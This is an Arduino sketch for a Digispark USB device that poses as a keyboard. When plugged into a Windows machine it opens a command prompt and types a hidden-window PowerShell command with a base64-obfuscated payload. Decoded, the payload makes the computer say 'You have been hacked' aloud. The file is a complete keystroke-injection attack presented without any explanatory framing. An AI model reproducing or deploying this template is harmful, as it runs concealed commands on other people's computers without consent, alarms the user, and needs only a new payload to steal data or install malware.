#define kbd_en_us
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(2500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -WindowStyle hidden -ec QQBkAGQALQBUAHkAcABlACAALQBBAE4AIABTAHkAcwB0AGUAbQAuAFMAcABlAGUAYwBoAAoAJABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFMAcABlAGUAYwBoAC4AUwB5AG4AdABoAGUAcwBpAHMALgBTAHAAZQBlAGMAaABTAHkAbgB0AGgAZQBzAGkAegBlAHIACgAkAG0AIAA9ACAAJwBZAG8AdQAgAGgAYQB2AGUAIABiAGUAZQBuACAAaABhAGMAawBlAGQAJwAKACQAcwAuAFMAcABlAGEAawAoACQAbQApAA==");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
}
